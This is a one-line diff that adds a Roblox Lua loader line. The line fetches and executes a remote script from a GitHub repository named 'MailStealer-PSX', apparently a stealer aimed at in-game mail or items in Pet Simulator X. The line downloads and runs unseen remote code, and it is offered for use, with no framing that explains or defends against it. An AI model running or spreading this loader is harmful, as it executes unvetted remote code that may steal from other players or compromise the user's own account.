@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ScriptRobloxx/MailStealer-PSX/main/MailStealer%20Script%201", true))()
